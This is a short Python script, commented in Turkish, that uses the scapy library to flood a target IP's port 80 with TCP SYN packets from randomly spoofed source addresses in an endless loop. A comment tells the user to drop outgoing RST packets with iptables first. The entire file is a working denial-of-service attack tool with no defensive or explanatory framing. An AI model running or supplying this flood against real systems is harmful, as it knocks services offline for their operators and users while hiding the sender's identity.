#! /usr/bin/python

#Öncesinde aşağıdaki iptables kuralının girlmesi gerekiyor
#iptables -t filter -A OUTPUT -p tcp --tcp-flags RST RST -j DROP

import sys
import random
from scapy.all import *

def main(argv):
	while(1):
		send(IP(src=str(random.randint(1,255))+"."+str(random.randint(1,255))+"."+str(random.randint(1,255))+"."+str(random.randint(1,255)),dst=sys.argv[1],id=123,ttl=100)/TCP(sport=RandShort(),dport=80,seq=123456,ack=1000,window=1000,flags="S"))


if __name__ == "__main__":
	main(sys.argv[1:])

